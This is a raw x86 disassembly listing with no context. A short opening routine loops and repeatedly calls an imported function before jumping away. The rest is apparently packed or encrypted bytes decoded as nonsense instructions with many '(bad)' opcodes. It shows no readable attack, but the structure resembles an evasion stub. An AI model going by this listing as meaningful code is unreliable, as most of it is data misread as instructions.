  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [eax],al
  41d514:	(bad)  
  41d515:	or     ebx,esp
  41d517:	(bad)  
  41d518:	(bad)  
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2+0x591f447b],1
  41d522:	jae    0x41d4b9
  41d524:	(bad)  
  41d525:	mov    dl,0xd0
  41d527:	and    esi,DWORD PTR ds:0xce6d2b10
  41d52d:	loope  0x41d573
  41d52f:	repnz push cs
  41d531:	cld    
  41d532:	das    
  41d533:	test   BYTE PTR [edi+eax*4],ah
  41d536:	jecxz  0x41d4e2
  41d538:	int    0x42
  41d53a:	sub    dh,bl
  41d53c:	push   esi
  41d53d:	loopne 0x41d548
  41d53f:	imul   eax,DWORD PTR [edi+0x19],0x596c0afe
  41d546:	in     eax,dx
  41d547:	loopne 0x41d4ed
  41d549:	mov    cl,0xf2
  41d54b:	adc    ecx,0x5fd4afa
  41d551:	xor    al,0x14
  41d553:	iret   
  41d554:	out    0x2e,eax
  41d556:	xchg   edx,eax
  41d557:	or     bh,0xe2
  41d55a:	or     BYTE PTR [ebp+0x67],cl
  41d55d:	mov    esp,0x7aa71d32
  41d562:	std    
  41d563:	sub    DWORD PTR [eax+0x72],ebp
  41d566:	xor    al,0xbe
  41d568:	repz pusha 
  41d56a:	dec    ecx
  41d56b:	ins    BYTE PTR es:[edi],dx
  41d56c:	retf   
  41d56d:	in     eax,0x58
  41d56f:	(bad)  
  41d570:	lods   al,BYTE PTR ds:[esi]
  41d571:	cmc    
  41d572:	jl     0x41d509
  41d574:	cmc    
  41d575:	jl     0x41d58d
  41d577:	inc    ecx
  41d578:	repnz std 
  41d57a:	xchg   BYTE PTR [edx],bl
  41d57c:	mov    edx,0x78309f73
  41d581:	out    dx,eax
  41d582:	test   DWORD PTR [edx],ebp
  41d584:	test   eax,0xccf34ed1
  41d589:	push   ebp
  41d58a:	add    BYTE PTR [esi],dl
  41d58c:	cwde   
  41d58d:	out    0x93,al
  41d58f:	and    al,0x6c
  41d592:	sub    ah,dh
  41d594:	fistp  DWORD PTR [ebp+0x8]
  41d597:	xchg   esp,eax
  41d598:	pop    ds
  41d599:	mov    dh,0x49
  41d59b:	(bad)
  41d59f:	js     0x41d604
  41d5a1:	cmp    DWORD PTR [ebp+0x11],edi
  41d5a4:	sub    dl,BYTE PTR ds:0x4463aea0
  41d5aa:	add    DWORD PTR [ebx],edx
  41d5ac:	clc    
  41d5ad:	call   0x178b0595
  41d5b2:	jnp    0x41d5aa
  41d5b4:	in     al,dx
  41d5b5:	daa    
  41d5b6:	xchg   bh,al
  41d5b8:	jmp    0x1dffe9b3
  41d5bd:	pop    ds
  41d5be:	mov    edi,ebx
  41d5c0:	mov    ds:0xd9dfd9e8,eax
  41d5c5:	lea    esp,[ebp+edx*4+0x7c]
  41d5c9:	jnp    0x41d59a
  41d5cb:	adc    BYTE PTR [edi],bh
  41d5cd:	fist   WORD PTR [eax]
  41d5cf:	xor    bl,cl
  41d5d1:	stos   DWORD PTR es:[edi],eax
  41d5d2:	sub    edi,edi
  41d5d4:	add    DWORD PTR [edx-0x7d],ebp
  41d5d7:	es jmp 0xab17:0xe340b85a
  41d5df:	adc    DWORD PTR [ebx-0x34],esi
  41d5e2:	dec    edi
  41d5e3:	retf   0xc1bb
  41d5e6:	and    DWORD PTR [ebx-0x76eff2d3],0x15
  41d5ed:	jecxz  0x41d58e
  41d5ef:	std    
  41d5f0:	xchg   ecx,eax
  41d5f1:	jo     0x41d5a0
  41d5f3:	add    BYTE PTR [ecx-0x3a9a6ac],ah
  41d5f9:	jle    0x41d598
  41d5fb:	addr16 mov edx,0xcf1e0cb7
  41d601:	sbb    dh,BYTE PTR [edi+0x56]
  41d604:	push   DWORD PTR [eax+0x4e]
  41d607:	popa   
  41d608:	cmp    eax,0x17869872
  41d60d:	dec    esp
  41d60e:	inc    eax
  41d60f:	pop    ebp
  41d610:	mov    edi,0x700015e2
  41d615:	xchg   ecx,eax
  41d616:	std    
  41d617:	(bad)  [esp+eiz*8+0x8]
  41d61b:	shl    esp,cl
  41d61d:	iret   
  41d61e:	shl    DWORD PTR es:[ebx],0xd0
  41d622:	mov    edx,0x4af9984a
  41d627:	and    DWORD PTR [ecx],esp
  41d629:	mov    eax,gs
  41d62b:	dec    ebp
  41d62c:	addr16 jns 0x41d606
  41d62f:	(bad)  
  41d630:	cld    
  41d631:	sbb    dl,ah
  41d633:	inc    ecx
  41d634:	rcr    BYTE PTR [eax+ecx*2-0x5e],1
  41d638:	sub    dh,BYTE PTR [ebp-0x3cd53c6b]
  41d63e:	dec    edx
  41d63f:	aam    0x21
  41d641:	ins    DWORD PTR es:[edi],dx
  41d642:	div    DWORD PTR [edx+0x44c76929]
  41d648:	test   al,0x77
  41d64a:	pop    ss
  41d64b:	test   DWORD PTR [edx-0x3008dd9],eax
  41d651:	or     dl,BYTE PTR ds:0x6c53f806
  41d657:	push   es
  41d658:	not    DWORD PTR [ecx+0x26766e11]
  41d65e:	sar    BYTE PTR [ebx+0x758ccd0c],0x38
  41d665:	add    DWORD PTR [ebp+0x45],edi
  41d668:	outs   dx,DWORD PTR ds:[esi]
  41d669:	adc    ecx,DWORD PTR [edi+eax*8-0x270b7f99]
  41d670:	clc    
  41d671:	mov    ds:0xaeb574a4,al
  41d676:	call   0x7db7ced6
  41d67b:	iret   
  41d67c:	not    DWORD PTR [esi-0x52]
  41d67f:	xor    edx,ebx
  41d681:	jmp    0x1590f727
  41d686:	and    DWORD PTR [edi],edi
  41d688:	(bad)  
  41d689:	(bad)  
  41d68a:	scas   eax,DWORD PTR es:[edi]
  41d68b:	scas   eax,DWORD PTR es:[edi]
  41d68c:	(bad)  
  41d68d:	and    al,0xf6
  41d68f:	mov    ebx,0x61b86f9e
  41d694:	jae    0x41d692
  41d696:	and    ebp,DWORD PTR [ebx-0x7ce20bd6]
  41d69c:	inc    eax
  41d69d:	push   cs
  41d69e:	dec    esp
  41d69f:	call   0xb1ae:0x4b3b86c9
  41d6a6:	dec    eax
  41d6a7:	arpl   WORD PTR [ebp-0x70c863a7],dx
  41d6ad:	lods   eax,DWORD PTR ds:[esi]
  41d6ae:	fist   WORD PTR [edi+0x41540158]
  41d6b4:	(bad)  
  41d6b5:	mov    bh,0xbb
  41d6b7:	call   0x12be7b27
  41d6bc:	test   eax,0xccb05505
  41d6c1:	xchg   esp,eax
  41d6c2:	dec    edx
  41d6c3:	clc    
  41d6c4:	popf   
  41d6c5:	sbb    esi,DWORD PTR [esi-0x2a4d7d6b]
  41d6cb:	sahf   
  41d6cc:	dec    ebp
  41d6cd:	jmp    0x41d68f
  41d6cf:	dec    ebx
  41d6d0:	add    al,0xf9
  41d6d2:	push   ecx
  41d6d3:	scas   eax,DWORD PTR es:[edi]
  41d6d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6d5:	cli    
  41d6d6:	test   esi,edi
  41d6d8:	jne    0x41d70d
  41d6da:	push   cs
  41d6db:	out    0x26,al
  41d6dd:	arpl   WORD PTR [esi],di
  41d6df:	mov    ch,0x97
  41d6e1:	push   esp
  41d6e2:	lahf   
  41d6e3:	fstp   QWORD PTR [edi+0x12]
  41d6e6:	cmp    BYTE PTR [ebp+0x739a7afa],ch
  41d6ec:	or     BYTE PTR [ecx],ch
  41d6ee:	jl     0x41d6a3
  41d6f0:	scas   eax,DWORD PTR es:[edi]
  41d6f1:	mov    ds:0x926cf6b4,al
  41d6f6:	int    0xaf
  41d6f8:	lar    ebx,WORD PTR [ebp+0x9]
  41d6fc:	or     eax,0x1e781bf5
  41d701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d702:	repz int3 
  41d704:	sbb    al,0x84
  41d706:	(bad)  
  41d707:	enter  0xf56c,0xce
  41d70b:	icebp  
  41d70c:	jp     0x41d778
  41d70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d70f:	(bad)  [ebp+edx*1-0x26]
  41d713:	cdq    
  41d714:	ins    DWORD PTR es:[edi],dx
  41d715:	mov    ecx,0x674bdb37
  41d71a:	in     eax,dx
  41d71b:	bswap  esi
  41d71d:	push   cs
  41d71e:	adc    BYTE PTR [edx-0x80],0xca
  41d722:	sbb    al,0x4d
  41d724:	push   edx
  41d725:	mov    BYTE PTR [ebp-0x56a93c01],cl
  41d72b:	(bad)  [edx]
  41d72d:	retf   
  41d72e:	repz daa 
  41d730:	and    eax,esp
  41d732:	push   ecx
  41d733:	fbstp  TBYTE PTR [eax+0x328914dd]
  41d739:	sub    al,0x8e
  41d73b:	ror    edi,1
  41d73d:	scas   eax,DWORD PTR es:[edi]
  41d73e:	cwde   
  41d73f:	inc    ebp
  41d740:	aam    0xf8
  41d742:	cmp    DWORD PTR [eax],edx
  41d744:	dec    ebx
  41d745:	ins    BYTE PTR es:[edi],dx
  41d746:	(bad)  
  41d747:	or     BYTE PTR [ebp+edx*4+0x699bb1a4],bh
  41d74e:	addr16 aaa 
  41d750:	or     eax,0xe0d4d836
  41d755:	rol    esp,cl
  41d757:	dec    esp
  41d758:	mov    ch,ch
  41d75a:	add    DWORD PTR [edx],0x552a85af
  41d760:	inc    eax
  41d761:	push   esp
  41d762:	push   es
  41d763:	mov    esi,0x18d76937
  41d768:	sahf   
  41d769:	mov    esp,0xaec73b61
  41d76e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d76f:	(bad)  
  41d771:	daa    
  41d772:	sbb    bh,ch
  41d774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d775:	stos   BYTE PTR es:[edi],al
  41d776:	pop    edi
  41d777:	mov    dl,0x78
  41d779:	push   DWORD PTR [ecx+ebp*1-0x55]
  41d77d:	out    0x51,eax
  41d77f:	adc    bh,BYTE PTR ds:0x3e98bdf6
  41d785:	ds (bad) 
  41d787:	loop   0x41d746
  41d789:	(bad)  
  41d78a:	jb     0x41d74d
  41d78c:	dec    edx
  41d78d:	jbe    0x41d76a
  41d78f:	shr    BYTE PTR ds:0xd60c43c6,1
  41d795:	lock mov ebx,0xa718031e
  41d79b:	je     0x41d81a
  41d79d:	cld    
  41d79e:	inc    ebp
  41d79f:	rcl    edx,1
  41d7a1:	mov    ds:0xc68bfcf0,al
  41d7a6:	cmp    BYTE PTR [eax-0xa],al
  41d7a9:	pusha  
  41d7aa:	cmp    DWORD PTR [esi-0x5f10b235],ebp
  41d7b0:	ds cwde 
  41d7b2:	loope  0x41d741
  41d7b4:	adc    esp,edx
  41d7b6:	mov    eax,ds:0xae22e52a
  41d7bb:	push   ds
  41d7bc:	lods   eax,DWORD PTR ds:[esi]
  41d7bd:	mov    eax,ds:0xec67b40
  41d7c2:	repz sbb edx,DWORD PTR [ebx+0x5c]
  41d7c6:	pop    ebx
  41d7c7:	dec    esi
  41d7c8:	repnz stc 
  41d7ca:	push   ebp
  41d7cb:	sbb    bl,BYTE PTR [edi+eiz*2+0x5b6ff8a8]
  41d7d2:	jnp    0x41d82f
  41d7d4:	and    eax,0x46de8dd6
  41d7d9:	(bad)  
  41d7da:	nop
  41d7db:	dec    edx
  41d7dc:	or     al,0x76
  41d7de:	out    dx,al
  41d7df:	and    BYTE PTR [ebx],cl
  41d7e1:	clc    
  41d7e2:	add    eax,0xfe0c737e
  41d7e7:	mov    bl,0x6c
  41d7e9:	jae    0x41d78e
  41d7eb:	dec    edx
  41d7ec:	aaa    
  41d7ed:	scas   al,BYTE PTR es:[edi]
  41d7ee:	sbb    al,0x47
  41d7f0:	sub    edx,DWORD PTR [esi]
  41d7f2:	sbb    ch,BYTE PTR ds:0x6afbebc4
  41d7f8:	bound  edi,QWORD PTR [ecx+0x6a5a7bb4]
  41d7fe:	jbe    0x41d7ff
  41d800:	test   cl,0x24
  41d803:	enter  0x5fc,0x9
  41d807:	or     al,0x65
  41d809:	inc    edx
  41d80a:	(bad)  
  41d80b:	lods   eax,DWORD PTR ds:[esi]
  41d80c:	or     BYTE PTR [esi-0x32],dh
  41d80f:	inc    esp
  41d810:	fnsave [edx+0x62821d60]
  41d816:	stos   DWORD PTR es:[edi],eax
  41d817:	adc    al,0xe3
  41d819:	call   0xf0d6:0xcd487b37
  41d820:	aad    0x2d
  41d822:	out    0xb5,eax
  41d824:	and    al,0xe7
  41d826:	rol    ah,1
  41d828:	fst    QWORD PTR [edi]
  41d82a:	xor    cl,ch
  41d82c:	mov    ecx,0xee8bc7c0
  41d831:	in     eax,0x7b
  41d833:	or     al,0x95
  41d835:	imul   ebx,DWORD PTR [ecx],0x78
  41d838:	cdq    
  41d839:	cmp    al,0xc3
  41d83b:	cmp    eax,0x34e85d0a
  41d840:	inc    ebp
  41d841:	fdivrp st(7),st
  41d843:	mov    ebp,0xcf7bf2e6
  41d848:	inc    ebp
  41d849:	lods   eax,DWORD PTR ds:[esi]
  41d84a:	xor    dh,BYTE PTR [ecx+0x69]
  41d84d:	mov    ah,0xeb
  41d84f:	cmp    esi,DWORD PTR [ecx]
  41d851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d852:	add    BYTE PTR [ecx],dh
  41d854:	daa    
  41d855:	cmc    
  41d856:	xchg   al,bh
  41d858:	sbb    ebp,edi
  41d85a:	push   es
  41d85b:	int3   
  41d85c:	jae    0x41d863
  41d85e:	sub    al,BYTE PTR [ebx]
  41d860:	xchg   ebx,eax
  41d861:	push   ss
  41d862:	into   
  41d863:	arpl   WORD PTR [esi],dx
  41d865:	xlat   BYTE PTR ds:[ebx]
  41d866:	jecxz  0x41d87a
  41d868:	retf   
  41d869:	sub    DWORD PTR [esp+0x56],0x63
  41d86e:	adc    al,BYTE PTR [eax-0x6d]
  41d871:	push   ss
  41d872:	inc    edx
  41d873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d874:	push   esp
  41d875:	inc    esp
  41d876:	jne    0x41d85a
  41d878:	sbb    al,0xdd
  41d87b:	mov    dl,0xc9
  41d87d:	scas   al,BYTE PTR es:[edi]
  41d87e:	rol    BYTE PTR [edx],1
  41d880:	mov    ah,0x6a
  41d882:	and    DWORD PTR [ebp-0x4b],edx
  41d885:	xor    ebp,esi
  41d887:	mul    ebp
  41d889:	xor    BYTE PTR [ebp+0x28],bh
  41d88c:	pop    es
  41d88d:	or     DWORD PTR ds:0xa1e4f983,eax
  41d893:	mov    cl,0x8e
  41d895:	scas   eax,DWORD PTR es:[edi]
  41d896:	in     al,0xe0
  41d898:	outs   dx,BYTE PTR ds:[esi]
  41d899:	lahf   
  41d89a:	jns    0x41d863
  41d89c:	clc    
  41d89d:	add    BYTE PTR [ebx-0x72],bl
  41d8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8a1:	cs cs leave 
  41d8a4:	aam    0x45
  41d8a6:	pop    es
  41d8a7:	out    dx,al
  41d8a8:	inc    edx
  41d8a9:	or     ecx,ebp
  41d8ab:	out    dx,al
  41d8ac:	in     eax,dx
  41d8ad:	retf   
  41d8ae:	ficomp DWORD PTR [edx]
  41d8b0:	vmread DWORD PTR [ecx-0x5f],esi
  41d8b4:	fcos   
  41d8b6:	add    al,0x8a
  41d8b8:	call   0xf081:0x373f766e
  41d8bf:	xor    eax,0x363a0ae8
  41d8c4:	add    edx,DWORD PTR [ebx-0x74]
  41d8c7:	or     esi,edi
  41d8c9:	cmp    esi,ebp
  41d8cb:	sbb    al,0x7
  41d8cd:	cmc    
  41d8ce:	lds    esi,FWORD PTR [edx]
  41d8d0:	ficom  DWORD PTR [eax+0x5d]
  41d8d3:	leave  
  41d8d4:	(bad)  
  41d8d5:	nop
  41d8d6:	fcom   st(1)
  41d8d8:	(bad)  
  41d8d9:	mov    eax,ds:0x99f40caf
  41d8de:	inc    eax
  41d8df:	fwait
  41d8e0:	pop    edx
  41d8e1:	dec    eax
  41d8e2:	add    DWORD PTR [ebx-0x7b],esi
  41d8e5:	jl     0x41d8e7
  41d8e7:	(bad)  
  41d8e8:	xchg   ebp,eax
  41d8e9:	aaa    
  41d8ea:	into   
  41d8eb:	mov    ah,dl
  41d8ed:	sbb    eax,DWORD PTR [edi+0x77]
  41d8f0:	lods   al,BYTE PTR es:[esi]
  41d8f2:	sbb    ecx,DWORD PTR [edi]
  41d8f4:	pop    fs
  41d8f6:	ins    DWORD PTR es:[edi],dx
  41d8f7:	cmp    ebp,DWORD PTR [ebx+0x2899c1d3]
  41d8fd:	mov    eax,ds:0x27541236
  41d902:	xchg   ecx,eax
  41d903:	xchg   edi,eax
  41d904:	stos   DWORD PTR es:[edi],eax
  41d905:	and    eax,0x48cc89b9
  41d90a:	mov    WORD PTR [eax-0x5bf9e21b],ss
  41d910:	outs   dx,BYTE PTR ds:[esi]
  41d911:	lea    eax,[esi-0x41]
  41d914:	addr16 mov ds:0xae04,eax
  41d918:	shl    edi,cl
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	clc    
  41d91c:	jne    0x41d8db
  41d91e:	inc    ebx
  41d91f:	adc    dl,bl
  41d921:	stos   BYTE PTR es:[edi],al
  41d922:	sub    BYTE PTR [ebx-0x45],dh
  41d925:	mov    esi,0xfb29713e
  41d92a:	add    bl,BYTE PTR [edi+0x19]
  41d92d:	int    0x2f
  41d92f:	jg     0x41d977
  41d931:	dec    esp
  41d932:	cmp    edx,DWORD PTR ss:[ebx+0x20]
  41d936:	and    eax,0x6bd1d7ac
  41d93b:	inc    esi
  41d93c:	pop    ecx
  41d93d:	push   ebp
  41d93e:	mov    dl,0xc7
  41d940:	shl    BYTE PTR [esi-0x54],0x32
  41d944:	daa    
  41d945:	xchg   edx,eax
  41d946:	in     eax,dx
  41d947:	and    eax,0x30cd4582
  41d94c:	pop    esi
  41d94d:	dec    esp
  41d94e:	call   0xab6a:0xe744a943
  41d955:	cli    
  41d956:	rcl    BYTE PTR [esi-0x25fbd707],1
  41d95c:	ins    DWORD PTR es:[edi],dx
  41d95d:	aaa    
  41d95e:	and    eax,0xa5321d43
  41d963:	push   ss
  41d964:	pop    ebx
  41d965:	xor    al,BYTE PTR [edx+0x6160bf0b]
  41d96b:	pop    ss
  41d96c:	pop    ds
  41d96d:	ins    DWORD PTR es:[edi],dx
  41d96e:	mov    ds:0x5e3c3df1,al
  41d973:	jmp    0x9fbac345
  41d978:	dec    esi
  41d979:	mov    al,0x4f
  41d97b:	push   ss
  41d97c:	int    0xd6
  41d97e:	shr    BYTE PTR [ebp-0x29],0x9
  41d982:	repz into 
  41d984:	aas    
  41d985:	mov    BYTE PTR [ebx+0x55],cl
  41d988:	jecxz  0x41d989
  41d98a:	rcr    DWORD PTR [eax-0xf],cl
  41d98d:	out    0xb9,eax
  41d98f:	lods   eax,DWORD PTR ds:[esi]
  41d990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d991:	sbb    dh,BYTE PTR ds:0x80a9280c
  41d997:	dec    ebx
  41d998:	(bad)  
  41d99a:	pushf  
  41d99b:	stos   BYTE PTR es:[edi],al
  41d99c:	jns    0x41d934
  41d99e:	in     al,0xf
  41d9a0:	ins    BYTE PTR es:[edi],dx
  41d9a1:	xchg   esi,eax
  41d9a2:	frstor [esi-0x58]
  41d9a5:	je     0x41d9b0
  41d9a7:	jo     0x41d9b1
  41d9a9:	cmp    ch,BYTE PTR [ebx+0x6c]
  41d9ac:	pop    ebp
  41d9ad:	loopne 0x41d9f5
  41d9af:	das    
  41d9b0:	or     cl,dl
  41d9b2:	scas   eax,DWORD PTR es:[edi]
  41d9b3:	fisttp QWORD PTR [eax]
  41d9b5:	int    0x25
  41d9b7:	jl     0x41d94f
  41d9b9:	mov    al,0x36
  41d9bb:	jle    0x41d9d5
  41d9bd:	mov    edi,0x12493652
  41d9c2:	cmp    edi,ecx
  41d9c4:	fcmovu st,st(0)
  41d9c6:	fwait
  41d9c7:	push   ds
  41d9c8:	inc    ebp
  41d9c9:	xor    eax,0xde7057f3
  41d9ce:	test   eax,0x5eeacca0
  41d9d3:	sub    DWORD PTR [edi+0x13751393],ebx
  41d9d9:	clc    
  41d9da:	lds    esi,FWORD PTR [edx+0x2c]
  41d9dd:	mov    esp,DWORD PTR [esi]
  41d9df:	and    eax,DWORD PTR ds:0x22ad78c7
  41d9e5:	mov    ds,eax
  41d9e7:	je     0x41d97d
  41d9e9:	(bad)  [eax+0x63]
  41d9ec:	or     DWORD PTR [esi+edi*1+0x30],0x58
  41d9f1:	sub    bl,ah
  41d9f3:	jl     0x41d991
  41d9f5:	push   edx
  41d9f6:	stos   DWORD PTR es:[di],eax
  41d9f8:	inc    esi
  41d9f9:	mov    esi,0x7925af5
  41d9fe:	out    0xdf,al
  41da00:	jno    0x41d99c
  41da02:	push   ss
  41da03:	push   cs
  41da04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da05:	hlt    
  41da06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da07:	xchg   edx,eax
  41da08:	and    cl,dl
  41da0a:	enter  0x7c1e,0x4
  41da0e:	out    dx,eax
  41da0f:	add    bh,BYTE PTR [edi]
  41da11:	fidivr DWORD PTR [edx+0x3fb8d257]
  41da17:	out    dx,al
  41da18:	adc    BYTE PTR [esi+0x5480d636],cl
  41da1e:	cmp    dl,BYTE PTR [eax-0xb]
  41da21:	(bad)  
  41da22:	aas    
  41da23:	push   edx
  41da24:	or     al,0xed
  41da26:	cmp    BYTE PTR [edx],bh
  41da28:	mov    cl,0x55
  41da2a:	(bad)  
  41da2b:	inc    ecx
  41da2c:	(bad)  
  41da2d:	push   edi
  41da2e:	cmp    eax,0x97d1f087
  41da33:	ins    BYTE PTR es:[edi],dx
  41da34:	sub    eax,0x2def79f
  41da39:	pop    ds
  41da3a:	out    dx,al
  41da3b:	mov    ah,0x56
  41da3d:	cmp    BYTE PTR [ebp-0x46c533d1],ah
  41da43:	push   edi
  41da44:	pop    ebp
  41da45:	mov    cl,BYTE PTR [edx+0x1a238130]
  41da4b:	ret    0x2030
  41da4e:	ficomp WORD PTR [eax+0x47]
  41da51:	fs or  eax,0x99b92626
  41da57:	cmp    BYTE PTR [eax+0x26],cl
  41da5a:	adc    al,0x71
  41da5c:	repnz or ch,BYTE PTR [eax-0x2424b005]
  41da63:	or     al,BYTE PTR [esi]
  41da65:	mov    al,ds:0x8438fc63
  41da6a:	dec    esp
  41da6b:	cmp    cl,ah
  41da6d:	pop    edx
  41da6f:	mov    dl,0x51
  41da71:	or     DWORD PTR [eax-0x1c],eax
  41da74:	cmp    bl,dh
  41da76:	and    dl,BYTE PTR [edx]
  41da78:	cmp    DWORD PTR [edi+0x4e3de066],0xb6cfa35e
  41da82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da83:	fdivr  QWORD PTR [ebx]
  41da85:	jl     0x41da0e
  41da87:	jns    0x41daa4
  41da89:	sbb    ah,BYTE PTR [eax+0x303006d7]
  41da8f:	popf   
  41da90:	dec    edi
  41da91:	jo     0x41dab2
  41da93:	inc    ebp
  41da94:	int    0x5b
  41da96:	mov    esi,0xa9cda41b
  41da9b:	xchg   ebp,eax
  41da9c:	scas   eax,DWORD PTR es:[edi]
  41da9d:	jge    0x41daa9
  41da9f:	or     DWORD PTR [esi+ebp*8],edx
  41daa2:	sub    al,0xb4
  41daa4:	inc    ebp
  41daa5:	loopne 0x41dafb
  41daa7:	inc    esi
  41daa8:	mov    dl,ah
  41daaa:	and    ebp,DWORD PTR [eax]
  41daac:	imul   edx,edi,0xe2b2ffdc
  41dab2:	jno    0x41daac
  41dab4:	add    eax,0x36ffbba
  41dab9:	push   ebx
  41daba:	in     al,dx
  41dabb:	jl     0x41da90
  41dabd:	xlat   BYTE PTR ds:[ebx]
  41dabe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dabf:	pop    ebp
  41dac0:	lock push ebx
  41dac2:	add    dl,BYTE PTR [esi+0x6c]
  41dac5:	fadd   DWORD PTR [edi+0x17]
  41dac8:	mov    ch,0x11
  41daca:	in     eax,dx
  41dacb:	xchg   ebx,eax
  41dacc:	pop    eax
  41dacd:	jecxz  0x41db18
  41dacf:	(bad)  
  41dad1:	jmp    0x41da8f
  41dad3:	mov    ebx,DWORD PTR [ebx+0x60acf169]
  41dad9:	add    BYTE PTR [ecx+0x6a],0x7d
  41dadd:	sar    BYTE PTR [eax],1
  41dadf:	daa    
  41dae0:	in     al,dx
  41dae1:	pop    esi
  41dae2:	std    
  41dae3:	ficomp WORD PTR [ebx]
  41dae5:	js     0x41db5c
  41dae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dae8:	xor    BYTE PTR [edi-0x1f],dl
  41daeb:	xchg   edi,eax
  41daec:	mov    ds:0xd3e9ac1e,al
  41daf1:	stos   BYTE PTR es:[edi],al
  41daf2:	mov    bl,0xa0
  41daf4:	call   0x336578af
  41daf9:	mov    eax,0x3fd24209
  41dafe:	pop    esp
  41daff:	sub    al,0x97
  41db01:	inc    edx
  41db02:	in     al,dx
  41db03:	imul   edi,DWORD PTR [ecx+0x44b99150],0x910eee06
  41db0d:	dec    edx
  41db0e:	dec    ecx
  41db0f:	dec    eax
  41db10:	retf   0xbcd2
  41db13:	inc    ebx
  41db14:	inc    ebx
  41db15:	ret    0x10ec
  41db18:	dec    esp
  41db19:	and    ebp,DWORD PTR [ecx]
  41db1b:	mov    bh,bl
  41db1d:	xchg   esi,eax
  41db1e:	mov    eax,ds:0xc9526ba4
  41db23:	and    esp,DWORD PTR [ebp-0x7325b8c9]
  41db29:	fldenv [ecx]
  41db2b:	fwait
  41db2c:	dec    ebx
  41db2d:	arpl   WORD PTR [ecx+0x750bd04d],cx
  41db33:	jbe    0x41db7c
  41db35:	enter  0xbb6,0x74
  41db39:	pop    edx
  41db3a:	mov    ch,0xea
  41db3c:	mov    DWORD PTR [edx+0x2c474741],esi
  41db42:	jle    0x41db3d
  41db44:	cmova  ecx,DWORD PTR [edi+0x26]
  41db48:	(bad)  
  41db49:	or     edx,DWORD PTR [ebp+0x42]
  41db4c:	test   dh,bl
  41db4e:	bound  esp,QWORD PTR [edx+0x51cf2d86]
  41db54:	retf   0x1668
  41db57:	test   BYTE PTR [edi],0xfe
  41db5a:	add    cl,BYTE PTR ds:0x56e53cfb
  41db60:	mov    WORD PTR [esi],fs
  41db62:	stc    
  41db63:	mov    edi,0xcb008331
  41db68:	add    BYTE PTR [eax+0xe],ch
  41db6b:	fs push ecx
  41db6d:	es xchg ecx,eax
  41db6f:	in     al,0x9c
  41db71:	in     al,dx
  41db72:	fsubr  QWORD PTR [esi+0x39]
  41db75:	pop    ds
  41db76:	inc    esp
  41db77:	inc    eax
  41db78:	sub    ebp,DWORD PTR [ebp+0xe]
  41db7b:	mov    ebx,0xa7c20160
  41db80:	out    dx,al
  41db81:	dec    esi
  41db82:	pop    edi
  41db83:	and    al,0xa8
  41db85:	std    
  41db86:	das    
  41db87:	mov    edi,0x8f91a748
  41db8c:	ds pusha 
  41db8e:	add    eax,0x2cdf43aa
  41db93:	sub    edx,DWORD PTR [edx+ebp*4+0x48]
  41db97:	fcmovnbe st,st(1)
  41db99:	enter  0x3b11,0x8e
  41db9d:	xchg   ebx,eax
  41db9e:	stos   DWORD PTR es:[edi],eax
  41db9f:	or     esi,esi
  41dba1:	inc    eax
  41dba2:	aas    
  41dba3:	jnp    0x41dc0f
  41dba5:	push   ecx
  41dba6:	std    
  41dba7:	enter  0xf57c,0x25
  41dbab:	ficom  WORD PTR [ecx-0x7a]
  41dbae:	ja     0x41db3a
  41dbb0:	fsubr  st,st(4)
  41dbb2:	and    eax,0x9dc27ac0
  41dbb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb8:	repnz loope 0x41dc05
  41dbbb:	push   ebp
  41dbbc:	xchg   edx,eax
  41dbbd:	retf   0xfbc2
  41dbc0:	mov    BYTE PTR [esi],cl
  41dbc2:	mov    ah,0x7
  41dbc4:	popf   
  41dbc5:	cmp    bl,BYTE PTR [esi+0x18]
  41dbc8:	cdq    
  41dbc9:	outs   dx,DWORD PTR ds:[esi]
  41dbca:	out    dx,eax
  41dbcb:	lock mov eax,ds:0xf9e8d0f
  41dbd1:	out    dx,al
  41dbd2:	rcr    BYTE PTR [ecx],1
  41dbd4:	mov    ebx,0x9c45b1bd
  41dbd9:	mov    al,0x46
  41dbdb:	lea    eax,[ebx+0x1eabe77]
  41dbe1:	ds ss icebp 
  41dbe4:	mov    eax,0xfa8ea23b
  41dbe9:	dec    ebx
  41dbea:	jle    0x41dc31
